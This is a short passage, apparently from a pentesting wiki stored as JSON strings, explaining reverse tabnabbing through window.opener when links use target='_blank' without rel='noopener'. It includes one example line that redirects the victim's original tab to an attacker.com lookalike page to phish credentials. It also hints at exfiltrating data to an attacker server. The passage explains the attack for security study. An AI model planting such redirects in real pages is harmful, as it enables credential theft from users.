    "In a situation where an **attacker** can **control** the **`href`** argument of an **`<a`** tag with the attribute **`target=\"_blank\" rel=\"opener\"`** that is going to be clicked by a victim, the **attacker** **point** this **link** to a web under his control (a **malicious** **website**). Then, once the **victim clicks** the link and access the attackers website, this **malicious** **website** will be able to **control** the **original** **page** via the javascript object **`window.opener`**.\\",
    "If the page doesn't have **`rel=\"opener\"` but contains `target=\"_blank\"` it also doesn't have `rel=\"noopener\"`** it might be also vulnerable.",
    "A regular way to abuse this behaviour would be to **change the location of the original web** via `window.opener.location = https://attacker.com/victim.html` to a web controlled by the attacker that **looks like the original one**, so it can **imitate** the **login** **form** of the original website and ask for credentials to the user.",
    "However, note that as the **attacker now can control the window object of the original website** he can abuse it in other ways to perform **stealthier attacks** (maybe modifying javascript events to ex-filtrate info to a server controlled by him?)",
